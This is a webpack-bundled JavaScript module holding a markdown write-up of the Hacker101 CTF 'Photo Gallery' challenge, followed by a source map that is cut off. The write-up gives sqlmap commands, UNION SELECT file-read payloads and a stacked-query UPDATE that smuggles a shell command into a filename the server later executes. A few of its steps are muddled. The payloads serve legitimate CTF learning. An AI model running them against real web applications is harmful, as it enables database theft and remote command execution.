exports.ids = [7];
exports.modules = {

/***/ "./md/blog/hacker101-ctf-photo-gallery.md":
/*!************************************************!*\
  !*** ./md/blog/hacker101-ctf-photo-gallery.md ***!
  \************************************************/
/*! exports provided: default */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
eval("__webpack_require__.r(__webpack_exports__);\n/* harmony default export */ __webpack_exports__[\"default\"] = (\"---\\ntitle: Hacker101 CTF Photo Gallery writeup\\ndescription: A write up for the Photo Gallery [moderae] challenge\\npublished: true\\ndatePublished: 1609676432536\\nauthor: lwlx\\nauthorTwitter: \\\"0x0000005\\\"\\nauthorPhoto: /profile.jpg\\ntags:\\n  - ctf\\n  - writeup\\n  - hackerone\\n  - hacker101\\n  - security\\nthumbnailPhoto: /hackerone/hackerone.png\\nbannerPhoto: /hackerone/hackerone.png\\ncanonicalUrl:\\n---\\n\\n# Photo Gallery _[moderate]_\\n\\nThis is my Write Up for the \\\"Photo Gallery\\\" challenge of HackerOne's CTF.\\n\\nAs usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.\\nThe missing one is called `Invisible`, so lets look into that.\\n\\n```\\nhttp://34.74.105.127/ad3e8c7df9/\\n```\\n\\n![initial page](/hackerone/photogallery-start.png \\\"initial page\\\")\\n\\n## Information gathering\\n\\nwith Burp we were able to find that the server returns no content for this image.\\nimages are loaded with a `GET` Request to the server like so:\\n\\n`GET /ad3e8c7df9/fetch?id=1 HTTP/1.1`\\n\\nthis also aligns with the first tip we are provided:\\n\\n> Hint 1: _Consider how you might build this system yourself. What would the **query for fetch** look like?_\\n\\nnaturally we start fuzzing the `id` parameter.\\n\\n```python\\nGET /ad3e8c7df9/fetch?id=4 HTTP/1.1 # 404\\nGET /ad3e8c7df9/fetch?id=0 HTTP/1.1 # 404\\nGET /ad3e8c7df9/fetch?id=-1 HTTP/1.1 # 500\\n```\\n\\nalright, no quick wins, so let's give it a try with fizzing using sqlmap.\\nQuickly we are able to see that the server seems to be vulnerable to some attack.\\n\\n```python\\nsqlmap -u \\\"http://34.74.105.127/ad3e8c7df9/fetch?id=2\\\"\\n```\\n\\nThis command runs for quite a while and will try to find vulnerabilities in the fetch endpoint.\\nwhen we are done we should know what to do next.\\n\\n## Gathered Data\\n\\n### sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:\\n\\n```python\\nParameter: id (GET)\\nType: boolean-based blind\\nTitle: AND boolean-based blind - WHERE or HAVING clause\\nPayload: id=2 AND 3567=3567\\n\\nType: time-based blind\\nTitle: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\\nPayload: id=2 AND (SELECT 8480 FROM (SELECT(SLEEP(5)))KHRS)\\n```\\n\\n```python\\n[21:44:44] [INFO] the back-end DBMS is MySQL\\nweb server operating system: Linux Ubuntu\\nweb application technology: Nginx 1.14.0\\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\\n```\\n\\n### Our Target Server:\\n\\n    | Type      | Service      | Version                  | Vulnerable?    |\\n    | --------- | ------------ | ------------------------ | -------------- |\\n    | OS        | Linux Ubuntu | ??                       | not focused    |\\n    | Webserver | Nginx        | 1.14.0                   | no             |\\n    | Database  | MySQL        | >= 5.0.12 (MariaDB fork) | yes (id param) |\\n\\nGood, we got something, we know the server is vulnerable to multiple vulnerabilities such as a 'boolean base blind'. We also found the Webserver is Nginx v1.14.0, which sadly has no usable vulnerabilities here. But with us now knowing the exact os and DB System used lets run sqlmap again with that info and see what we get.\\n\\n```python\\nsqlmap -u \\\"http://34.74.105.127/ad3e8c7df9/fetch?id=2\\\" -f --os=linux --dbms=mysql --level=3 -o\\n```\\n\\nwe dont really get any more useful information from here.\\nsoo.. were kinda stuck lets just get another hint then:\\n\\n> Hint 2: _Take a few minutes to consider the **state of the union**_\\n\\nThe state uf the union? are they hinting on using UNION statements in the query?\\n_The UNION operator is used to combine the result-set of two or more SELECT statements._\\nThat seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:\\n\\nhttp://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'\\n\\nbut what do we look for? Lets get another hint.\\n\\n> Hint 3: _This application runs on the **uwsgi-nginx-flask-docker** image_\\n\\nuwsgi-nginx? hmm havent heard of that, but sems to be some kind of portable all in one flask. lets look for the docs.\\n\\nhttps://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files\\n\\n> uWSGI can be configured using several different methods.\\n\\nYAML, JSON, INI are some supported formats -> ini beeing the defualt so lets try getting the 'uwsgi.ini' file?\\n\\n![union select wiht burp repeater](/hackerone/union-select-ini.png \\\"union select wiht burp repeater\\\")\\n\\nthis returns us some configdata pointing to module main which is the entrypoint.\\n\\n```python\\n[uwsgi]\\nmodule = main\\ncallable = app\\n```\\n\\nso lets see if we can also fethc the main.py\\n\\n```python\\nhttp://35.190.155.168/c947e97f6e/fetch?id=4%20UNION%20SELECT%20%27main.py%27--\\n```\\n\\nHere we get lots of infos our **first FLAG** and the db connection settings:\\n\\n### FLAG 0:\\n\\n```python\\n%s\\n' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\\\\n', 1)[-1] + '' rep += '\\n\\\\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404)\\n# It's dangerous to go alone, take this: # ^FLAG^9e6d57c394c129??????????????????????????????f74dbf2faa0abd571b32c7$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == \\\"__main__\\\": app.run(host='0.0.0.0', port=80)\\n```\\n\\n`return MySQLdb.connect(host=\\\"localhost\\\", user=\\\"root\\\", password=\\\"\\\", db=\\\"level5\\\")`\\n\\nwe also see that they are using the photos table\\n\\n`cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))`\\n\\nlets try to fuzz that with sqlmap, since we now know the DB and tables info we can launch a targeted attack.\\n\\n```python\\nsqlmap -u \\\"http://34.74.105.127/ad3e8c7df9/fetch?id=1\\\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 2\\n```\\n\\nThis can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column `filename` since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.\\n\\n```python\\nsqlmap -u \\\"http://35.190.155.168/c947e97f6e/fetch?id=3\\\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 4 -C filename\\n```\\n\\nThis means that swlmap will start with the filename of id=3 which is exactly what we want right now.\\n\\n![starts to query filename of id 3](/hackerone/photo-gallery-hash.png \\\"query on the filename of id 3\\\")\\nSo lets have a look at our results:\\n\\n```python\\nDatabase: level5\\nTable: photos\\n[3 entries]\\n+------------------------------------------------------------------+\\n| filename |\\n+------------------------------------------------------------------+\\n| 9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa |\\n| files/adorable.jpg |\\n| files/purrfect.jpg |\\n+------------------------------------------------------------------+\\n```\\n\\n> you might be getting partial values like so:\\n> `9ef8fc5di15625db993f1c8e120beafc6873d801a804670?????????????????`\\n> you should be able to re-run sqlmap to find the missing characters\\n> `9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa`\\n\\ndecrypted: `\\\\*||+ls+-a+tmp.txt`\\n\\nso we try this request:\\n`GET /ad3e8c7df9/fetch?id=3\\\\*||+ls+-a+tmp.txt`\\n\\n`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\\\\*%20||%20ls%20./files%20%3Etmp.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1`\\n\\n`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'temp.txt'-- HTTP/1.1`\\n\\n```bash\\n\\\"^FLAG^9ef8fc5da15????????????????????????????????????????????782ca11fa$FLAG$\\\"\\n\\\"^FLAG^63a407d0083????????????????????????????????????????????4564ee9f2$FLAG$\\\"\\nHOSTNAME=ad3e8c7df92d\\nSHLVL=0\\n```\\n\");//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8vLi9tZC9ibG9nL2hhY2tlcjEwMS1jdGYtcGhvdG8tZ2FsbGVyeS5tZD84ZGNiIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0FBQWUsZ2hQQUFpOU8saUdBQWlHLFVBQVUseVNBQXlTIiwiZmlsZSI6Ii4vbWQvYmxvZy9oYWNrZXIxMDEtY3RmLXBob3RvLWdhbGxlcnkubWQuanMiLCJzb3VyY2VzQ29udGVudCI6WyJleHBvcnQgZGVmYXVsdCBcIi0tLVxcbnRpdGxlOiBIYWNrZXIxMDEgQ1RGIFBob3RvIEdhbGxlcnkgd3JpdGV1cFxcbmRlc2NyaXB0aW9uOiBBIHdyaXRlIHVwIGZvciB0aGUgUGhvdG8gR2FsbGVyeSBbbW9kZXJhZV0gY2hhbGxlbmdlXFxucHVibGlzaGVkOiB0cnVlXFxuZGF0ZVB1Ymxpc2hlZDogMTYwOTY3NjQzMjUzNlxcbmF1dGhvcjogbHdseFxcbmF1dGhvclR3aXR0ZXI6IFxcXCIweDAwMDAwMDVcXFwiXFxuYXV0aG9yUGhvdG86IC9wcm9maWxlLmpwZ1xcbnRhZ3M6XFxuICAtIGN0ZlxcbiAgLSB3cml0ZXVwXFxuICAtIGhhY2tlcm9uZVxcbiAgLSBoYWNrZXIxMDFcXG4gIC0gc2VjdXJpdHlcXG50aHVtYm5haWxQaG90bzogL2hhY2tlcm9uZS9oYWNrZXJvbmUucG5nXFxuYmFubmVyUGhvdG86IC9oYWNrZXJvbmUvaGFja2Vyb25lLnBuZ1xcbmNhbm9uaWNhbFVybDpcXG4tLS1cXG5cXG4jIFBob3RvIEdhbGxlcnkgX1ttb2RlcmF0ZV1fXFxuXFxuVGhpcyBpcyBteSBXcml0ZSBVcCBmb3IgdGhlIFxcXCJQaG90byBHYWxsZXJ5XFxcIiBjaGFsbGVuZ2Ugb2YgSGFja2VyT25lJ3MgQ1RGLlxcblxcbkFzIHVzdWFsIHdlIGdldCBhIGxpbmsgdG8gd2VicGFnZSwgaXQgc2VlbXMgdG8gYmUgYW4gaW1hZ2UgZ2FsbGVyeSwgYnV0IG9uZSBvZiB0aGUgaW1hZ2VzIGlzIGJyb2tlbi5cXG5UaGUgbWlzc2luZyBvbmUgaXMgY2FsbGVkIGBJbnZpc2libGVgLCBzbyBsZXRzIGxvb2sgaW50byB0aGF0LlxcblxcbmBgYFxcbmh0dHA6Ly8zNC43NC4xMDUuMTI3L2FkM2U4YzdkZjkvXFxuYGBgXFxuXFxuIVtpbml0aWFsIHBhZ2VdKC9oYWNrZXJvbmUvcGhvdG9nYWxsZXJ5LXN0YXJ0LnBuZyBcXFwiaW5pdGlhbCBwYWdlXFxcIilcXG5cXG4jIyBJbmZvcm1hdGlvbiBnYXRoZXJpbmdcXG5cXG53aXRoIEJ1cnAgd2Ugd2VyZSBhYmxlIHRvIGZpbmQgdGhhdCB0aGUgc2VydmVyIHJldHVybnMgbm8gY29udGVudCBmb3IgdGhpcyBpbWFnZS5cXG5pbWFnZXMgYXJlIGxvYWRlZCB3aXRoIGEgYEdFVGAgUmVxdWVzdCB0byB0aGUgc2VydmVyIGxpa2Ugc286XFxuXFxuYEdFVCAvYWQzZThjN2RmOS9mZXRjaD9pZD0xIEhUVFAvMS4xYFxcblxcbnRoaXMgYWxzbyBhbGlnbnMgd2l0aCB0aGUgZmlyc3QgdGlwIHdlIGFyZSBwcm92aWRlZDpcXG5cXG4+IEhpbnQgMTogX0NvbnNpZGVyIGhvdyB5b3UgbWlnaHQgYnVpbGQgdGhpcyBzeXN0ZW0geW91cnNlbGYuIFdoYXQgd291bGQgdGhlICoqcXVlcnkgZm9yIGZldGNoKiogbG9vayBsaWtlP19cXG5cXG5uYXR1cmFsbHkgd2Ugc3RhcnQgZnV6emluZyB0aGUgYGlkYCBwYXJhbWV0ZXIuXFxuXFxuYGBgcHl0aG9uXFxuR0VUIC9hZDNlOGM3ZGY5L2ZldGNoP2lkPTQgSFRUUC8xLjEgIyA0MDRcXG5HRVQgL2FkM2U4YzdkZjkvZmV0Y2g/aWQ9MCBIVFRQLzEuMSAjIDQwNFxcbkdFVCAvYWQzZThjN2RmOS9mZXRjaD9pZD0tMSBIVFRQLzEuMSAjIDUwMFxcbmBgYFxcblxcbmFscmlnaHQsIG5vIHF1aWNrIHdpbnMsIHNvIGxldCdzIGdpdmUgaXQgYSB0cnkgd2l0aCBmaXp6aW5nIHVzaW5nIHNxbG1hcC5cXG5RdWlja2x5IHdlIGFyZSBhYmxlIHRvIHNlZSB0aGF0IHRoZSBzZXJ2ZXIgc2VlbXMgdG8gYmUgdnVsbmVyYWJsZSB0byBzb21lIGF0dGFjay5cXG5cXG5gYGBweXRob25cXG5zcWxtYXAgLXUgXFxcImh0dHA6Ly8zNC43NC4xMDUuMTI3L2FkM2U4YzdkZjkvZmV0Y2g/aWQ9MlxcXCJcXG5gYGBcXG5cXG5UaGlzIGNvbW1hbmQgcnVucyBmb3IgcXVpdGUgYSB3aGlsZSBhbmQgd2lsbCB0cnkgdG8gZmluZCB2dWxuZXJhYmlsaXRpZXMgaW4gdGhlIGZldGNoIGVuZHBvaW50LlxcbndoZW4gd2UgYXJlIGRvbmUgd2Ugc2hvdWxkIGtub3cgd2hhdCB0byBkbyBuZXh0LlxcblxcbiMjIEdhdGhlcmVkIERhdGFcXG5cXG4jIyMgc3FsbWFwIGlkZW50aWZpZWQgdGhlIGZvbGxvd2luZyBpbmplY3Rpb24gcG9pbnQocykgd2l0aCBhIHRvdGFsIG9mIDMxMSBIVFRQKHMpIHJlcXVlc3RzOlxcblxcbmBgYHB5dGhvblxcblBhcmFtZXRlcjogaWQgKEdFVClcXG5UeXBlOiBib29sZWFuLWJhc2VkIGJsaW5kXFxuVGl0bGU6IEFORCBib29sZWFuLWJhc2VkIGJsaW5kIC0gV0hFUkUgb3IgSEFWSU5HIGNsYXVzZVxcblBheWxvYWQ6IGlkPTIgQU5EIDM1Njc9MzU2N1xcblxcblR5cGU6IHRpbWUtYmFzZWQgYmxpbmRcXG5UaXRsZTogTXlTUUwgPj0gNS4wLjEyIEFORCB0aW1lLWJhc2VkIGJsaW5kIChxdWVyeSBTTEVFUClcXG5QYXlsb2FkOiBpZD0yIEFORCAoU0VMRUNUIDg0ODAgRlJPTSAoU0VMRUNUKFNMRUVQKDUpKSlLSFJTKVxcbmBgYFxcblxcbmBgYHB5dGhvblxcblsyMTo0NDo0NF0gW0lORk9dIHRoZSBiYWNrLWVuZCBEQk1TIGlzIE15U1FMXFxud2ViIHNlcnZlciBvcGVyYXRpbmcgc3lzdGVtOiBMaW51eCBVYnVudHVcXG53ZWIgYXBwbGljYXRpb24gdGVjaG5vbG9neTogTmdpbnggMS4xNC4wXFxuYmFjay1lbmQgREJNUzogTXlTUUwgPj0gNS4wLjEyIChNYXJpYURCIGZvcmspXFxuYGBgXFxuXFxuIyMjIE91ciBUYXJnZXQgU2VydmVyOlxcblxcbiAgICB8IFR5cGUgICAgICB8IFNlcnZpY2UgICAgICB8IFZlcnNpb24gICAgICAgICAgICAgICAgICB8IFZ1bG5lcmFibGU/ICAgIHxcXG4gICAgfCAtLS0tLS0tLS0gfCAtLS0tLS0tLS0tLS0gfCAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gfCAtLS0tLS0tLS0tLS0tLSB8XFxuICAgIHwgT1MgICAgICAgIHwgTGludXggVWJ1bnR1IHwgPz8gICAgICAgICAgICAgICAgICAgICAgIHwgbm90IGZvY3VzZWQgICAgfFxcbiAgICB8IFdlYnNlcnZlciB8IE5naW54ICAgICAgICB8IDEuMTQuMCAgICAgICAgICAgICAgICAgICB8IG5vICAgICAgICAgICAgIHxcXG4gICAgfCBEYXRhYmFzZSAgfCBNeVNRTCAgICAgICAgfCA+PSA1LjAuMTIgKE1hcmlhREIgZm9yaykgfCB5ZXMgKGlkIHBhcmFtKSB8XFxuXFxuR29vZCwgd2UgZ290IHNvbWV0aGluZywgd2Uga25vdyB0aGUgc2VydmVyIGlzIHZ1bG5lcmFibGUgdG8gbXVsdGlwbGUgdnVsbmVyYWJpbGl0aWVzIHN1Y2ggYXMgYSAnYm9vbGVhbiBiYXNlIGJsaW5kJy4gV2UgYWxzbyBmb3VuZCB0aGUgV2Vic2VydmVyIGlzIE5naW54IHYxLjE0LjAsIHdoaWNoIHNhZGx5IGhhcyBubyB1c2FibGUgdnVsbmVyYWJpbGl0aWVzIGhlcmUuIEJ1dCB3aXRoIHVzIG5vdyBrbm93aW5nIHRoZSBleGFjdCBvcyBhbmQgREIgU3lzdGVtIHVzZWQgbGV0cyBydW4gc3FsbWFwIGFnYWluIHdpdGggdGhhdCBpbmZvIGFuZCBzZWUgd2hhdCB3ZSBnZXQuXFxuXFxuYGBgcHl0aG9uXFxuc3FsbWFwIC11IFxcXCJodHRwOi8vMzQuNzQuMTA1LjEyNy9hZDNlOGM3ZGY5L2ZldGNoP2lkPTJcXFwiIC1mIC0tb3M9bGludXggLS1kYm1zPW15c3FsIC0tbGV2ZWw9MyAtb1xcbmBgYFxcblxcbndlIGRvbnQgcmVhbGx5IGdldCBhbnkgbW9yZSB1c2VmdWwgaW5mb3JtYXRpb24gZnJvbSBoZXJlLlxcbnNvby4uIHdlcmUga2luZGEgc3R1Y2sgbGV0cyBqdXN0IGdldCBhbm90aGVyIGhpbnQgdGhlbjpcXG5cXG4+IEhpbnQgMjogX1Rha2UgYSBmZXcgbWludXRlcyB0byBjb25zaWRlciB0aGUgKipzdGF0ZSBvZiB0aGUgdW5pb24qKl9cXG5cXG5UaGUgc3RhdGUgdWYgdGhlIHVuaW9uPyBhcmUgdGhleSBoaW50aW5nIG9uIHVzaW5nIFVOSU9OIHN0YXRlbWVudHMgaW4gdGhlIHF1ZXJ5P1xcbl9UaGUgVU5JT04gb3BlcmF0b3IgaXMgdXNlZCB0byBjb21iaW5lIHRoZSByZXN1bHQtc2V0IG9mIHR3byBvciBtb3JlIFNFTEVDVCBzdGF0ZW1lbnRzLl9cXG5UaGF0IHNlZW1zIGxpa2Ugc29tZXRobmcgd2UgY2FuIG1ha2UgdXNlIG9mLCBzbyBsZXRzIHRyeSBhbmQgY29tYmluZSBvdXIgcXVlcnkgc3RhdGVtZW50cyBmLmUuIGxpa2UgdGhpczpcXG5cXG5odHRwOi8vMzQuNzQuMTA1LjEyNy9hZDNlOGM3ZGY5L2ZldGNoP2lkPTIgVU5JT04gU0VMRUNUICdzb21ldGhpbmcnXFxuXFxuYnV0IHdoYXQgZG8gd2UgbG9vayBmb3I/IExldHMgZ2V0IGFub3RoZXIgaGludC5cXG5cXG4+IEhpbnQgMzogX1RoaXMgYXBwbGljYXRpb24gcnVucyBvbiB0aGUgKip1d3NnaS1uZ2lueC1mbGFzay1kb2NrZXIqKiBpbWFnZV9cXG5cXG51d3NnaS1uZ2lueD8gaG1tIGhhdmVudCBoZWFyZCBvZiB0aGF0LCBidXQgc2VtcyB0byBiZSBzb21lIGtpbmQgb2YgcG9ydGFibGUgYWxsIGluIG9uZSBmbGFzay4gbGV0cyBsb29rIGZvciB0aGUgZG9jcy5cXG5cXG5odHRwczovL3V3c2dpLWRvY3MucmVhZHRoZWRvY3MuaW8vZW4vbGF0ZXN0L0NvbmZpZ3VyYXRpb24uaHRtbCNpbmktZmlsZXNcXG5cXG4+IHVXU0dJIGNhbiBiZSBjb25maWd1cmVkIHVzaW5nIHNldmVyYWwgZGlmZmVyZW50IG1ldGhvZHMuXFxuXFxuWUFNTCwgSlNPTiwgSU5JIGFyZSBzb21lIHN1cHBvcnRlZCBmb3JtYXRzIC0+IGluaSBiZWVpbmcgdGhlIGRlZnVhbHQgc28gbGV0cyB0cnkgZ2V0dGluZyB0aGUgJ3V3c2dpLmluaScgZmlsZT9cXG5cXG4hW3VuaW9uIHNlbGVjdCB3aWh0IGJ1cnAgcmVwZWF0ZXJdKC9oYWNrZXJvbmUvdW5pb24tc2VsZWN0LWluaS5wbmcgXFxcInVuaW9uIHNlbGVjdCB3aWh0IGJ1cnAgcmVwZWF0ZXJcXFwiKVxcblxcbnRoaXMgcmV0dXJucyB1cyBzb21lIGNvbmZpZ2RhdGEgcG9pbnRpbmcgdG8gbW9kdWxlIG1haW4gd2hpY2ggaXMgdGhlIGVudHJ5cG9pbnQuXFxuXFxuYGBgcHl0aG9uXFxuW3V3c2dpXVxcbm1vZHVsZSA9IG1haW5cXG5jYWxsYWJsZSA9IGFwcFxcbmBgYFxcblxcbnNvIGxldHMgc2VlIGlmIHdlIGNhbiBhbHNvIGZldGhjIHRoZSBtYWluLnB5XFxuXFxuYGBgcHl0aG9uXFxuaHR0cDovLzM1LjE5MC4xNTUuMTY4L2M5NDdlOTdmNmUvZmV0Y2g/aWQ9NCUyMFVOSU9OJTIwU0VMRUNUJTIwJTI3bWFpbi5weSUyNy0tXFxuYGBgXFxuXFxuSGVyZSB3ZSBnZXQgbG90cyBvZiBpbmZvcyBvdXIgKipmaXJzdCBGTEFHKiogYW5kIHRoZSBkYiBjb25uZWN0aW9uIHNldHRpbmdzOlxcblxcbiMjIyBGTEFHIDA6XFxuXFxuYGBgcHl0aG9uXFxuJXNcXG4nICUgKHBpZCwgc2FuaXRpemUocHRpdGxlKSkgZm5zLmFwcGVuZChwZm4pIHJlcCArPSAnU3BhY2UgdXNlZDogJyArIHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCdkdSAtY2ggJXMgfHwgZXhpdCAwJyAlICcgJy5qb2luKCdmaWxlcy8nICsgZm4gZm9yIGZuIGluIGZucyksIHNoZWxsPVRydWUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCkuc3RyaXAoKS5yc3BsaXQoJ1xcXFxuJywgMSlbLTFdICsgJycgcmVwICs9ICdcXG5cXFxcbicgcmV0dXJuIGhvbWUucmVwbGFjZSgnJEFMQlVNUyQnLCByZXApIEBhcHAucm91dGUoJy9mZXRjaCcpIGRlZiBmZXRjaCgpOiBjdXIgPSBnZXREYigpLmN1cnNvcigpIGlmIGN1ci5leGVjdXRlKCdTRUxFQ1QgZmlsZW5hbWUgRlJPTSBwaG90b3MgV0hFUkUgaWQ9JXMnICUgcmVxdWVzdC5hcmdzWydpZCddKSA9PSAwOiBhYm9ydCg0MDQpXFxuIyBJdCdzIGRhbmdlcm91cyB0byBnbyBhbG9uZSwgdGFrZSB0aGlzOiAjIF5GTEFHXjllNmQ1N2MzOTRjMTI5Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Zjc0ZGJmMmZhYTBhYmQ1NzFiMzJjNyRGTEFHJCByZXR1cm4gZmlsZSgnLi8lcycgJSBjdXIuZmV0Y2hvbmUoKVswXS5yZXBsYWNlKCcuLicsICcnKSwgJ3JiJykucmVhZCgpIGlmIF9fbmFtZV9fID09IFxcXCJfX21haW5fX1xcXCI6IGFwcC5ydW4oaG9zdD0nMC4wLjAuMCcsIHBvcnQ9ODApXFxuYGBgXFxuXFxuYHJldHVybiBNeVNRTGRiLmNvbm5lY3QoaG9zdD1cXFwibG9jYWxob3N0XFxcIiwgdXNlcj1cXFwicm9vdFxcXCIsIHBhc3N3b3JkPVxcXCJcXFwiLCBkYj1cXFwibGV2ZWw1XFxcIilgXFxuXFxud2UgYWxzbyBzZWUgdGhhdCB0aGV5IGFyZSB1c2luZyB0aGUgcGhvdG9zIHRhYmxlXFxuXFxuYGN1ci5leGVjdXRlKCdTRUxFQ1QgaWQsIHRpdGxlLCBmaWxlbmFtZSBGUk9NIHBob3RvcyBXSEVSRSBwYXJlbnQ9JXMgTElNSVQgMycsIChpZCwgKSlgXFxuXFxubGV0cyB0cnkgdG8gZnV6eiB0aGF0IHdpdGggc3FsbWFwLCBzaW5jZSB3ZSBub3cga25vdyB0aGUgREIgYW5kIHRhYmxlcyBpbmZvIHdlIGNhbiBsYXVuY2ggYSB0YXJnZXRlZCBhdHRhY2suXFxuXFxuYGBgcHl0aG9uXFxuc3FsbWFwIC11IFxcXCJodHRwOi8vMzQuNzQuMTA1LjEyNy9hZDNlOGM3ZGY5L2ZldGNoP2lkPTFcXFwiIC0tbWV0aG9kPUdFVCAtLWR1bXAgLUQgbGV2ZWw1IC1UIHBob3RvcyAtcCBpZCwgLS1jb2RlPTIwMCAtLWlnbm9yZS1jb2RlPTUwMCAtLXNraXAtd2FmIC1vIC0tdGhyZWFkcyAyXFxuYGBgXFxuXFxuVGhpcyBjYW4gdGFrZSBxdWl0ZSBhIHdoaWxlLi4gZm9yIG1lIGl0IGNyYXNoZWQgYWZ0ZXIgNDAgbWludXRlcywgc28gaSBnYXZlIGl0IGFub3RoZXIgZ28gd2l0aCBqdXN0IGZvY3VzaW5nIG9uIHRoZSBjb2x1bW4gYGZpbGVuYW1lYCBzaW5jZSwgaGVyZSBpcyB0aGUgdmFsdWUgd2UgbmVlZC53ZSBkbyB0aGlzIGJ5IGFkZGluZyB0aGUgLUMgcGFyYW1ldGVyLCBpIGFsc28gaW5jcmVhc2VkIHRoZSB0aHJhZGNvdW50IHRvIDQgdG8gdHJ5IGFuZCBnZXQgZmFzdGVyIHJlc3VsdHMuIEkgYWxzbyBjaGFuZ2VkIHRoZSB1cmwgdG8gY29udGFpbiBpZD0zIHNpbmNlIHRoaXMgaXMgdGhlIGlkIHdlIHdhbnQgdG8gZ2V0IHRoZSBpbmZvIGZyb20uXFxuXFxuYGBgcHl0aG9uXFxuc3FsbWFwIC11IFxcXCJodHRwOi8vMzUuMTkwLjE1NS4xNjgvYzk0N2U5N2Y2ZS9mZXRjaD9pZD0zXFxcIiAtLW1ldGhvZD1HRVQgLS1kdW1wIC1EIGxldmVsNSAtVCBwaG90b3MgLXAgaWQsIC0tY29kZT0yMDAgLS1pZ25vcmUtY29kZT01MDAgLS1za2lwLXdhZiAtbyAtLXRocmVhZHMgNCAtQyBmaWxlbmFtZVxcbmBgYFxcblxcblRoaXMgbWVhbnMgdGhhdCBzd2xtYXAgd2lsbCBzdGFydCB3aXRoIHRoZSBmaWxlbmFtZSBvZiBpZD0zIHdoaWNoIGlzIGV4YWN0bHkgd2hhdCB3ZSB3YW50IHJpZ2h0IG5vdy5cXG5cXG4hW3N0YXJ0cyB0byBxdWVyeSBmaWxlbmFtZSBvZiBpZCAzXSgvaGFja2Vyb25lL3Bob3RvLWdhbGxlcnktaGFzaC5wbmcgXFxcInF1ZXJ5IG9uIHRoZSBmaWxlbmFtZSBvZiBpZCAzXFxcIilcXG5TbyBsZXRzIGhhdmUgYSBsb29rIGF0IG91ciByZXN1bHRzOlxcblxcbmBgYHB5dGhvblxcbkRhdGFiYXNlOiBsZXZlbDVcXG5UYWJsZTogcGhvdG9zXFxuWzMgZW50cmllc11cXG4rLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tK1xcbnwgZmlsZW5hbWUgfFxcbistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rXFxufCA5ZWY4ZmM1ZGExNTYyNWRiOTkzZjFjOGUxMjBiZWFmYzY4NzNkODAxYTgwNDY3MGI5NDk3ZWNjNzgyY2ExMWZhIHxcXG58IGZpbGVzL2Fkb3JhYmxlLmpwZyB8XFxufCBmaWxlcy9wdXJyZmVjdC5qcGcgfFxcbistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rXFxuYGBgXFxuXFxuPiB5b3UgbWlnaHQgYmUgZ2V0dGluZyBwYXJ0aWFsIHZhbHVlcyBsaWtlIHNvOlxcbj4gYDllZjhmYzVkaTE1NjI1ZGI5OTNmMWM4ZTEyMGJlYWZjNjg3M2Q4MDFhODA0NjcwPz8/Pz8/Pz8/Pz8/Pz8/Pz9gXFxuPiB5b3Ugc2hvdWxkIGJlIGFibGUgdG8gcmUtcnVuIHNxbG1hcCB0byBmaW5kIHRoZSBtaXNzaW5nIGNoYXJhY3RlcnNcXG4+IGA5ZWY4ZmM1ZGExNTYyNWRiOTkzZjFjOGUxMjBiZWFmYzY4NzNkODAxYTgwNDY3MGI5NDk3ZWNjNzgyY2ExMWZhYFxcblxcbmRlY3J5cHRlZDogYFxcXFwqfHwrbHMrLWErdG1wLnR4dGBcXG5cXG5zbyB3ZSB0cnkgdGhpcyByZXF1ZXN0OlxcbmBHRVQgL2FkM2U4YzdkZjkvZmV0Y2g/aWQ9M1xcXFwqfHwrbHMrLWErdG1wLnR4dGBcXG5cXG5gR0VUIC9hZDNlOGM3ZGY5L2ZldGNoP2lkPTE7JTIwdXBkYXRlJTIwcGhvdG9zJTIwc2V0JTIwZmlsZW5hbWU9JTI3XFxcXColMjB8fCUyMGxzJTIwLi9maWxlcyUyMCUzRXRtcC50eHQlMjAlMjclMjB3aGVyZSUyMGlkPTM7JTIwY29tbWl0OyUyMC0tIEhUVFAvMS4xYFxcblxcbmBHRVQgL2FkM2U4YzdkZjkvZmV0Y2g/aWQ9NCBVTklPTiBTRUxFQ1QgJ3RlbXAudHh0Jy0t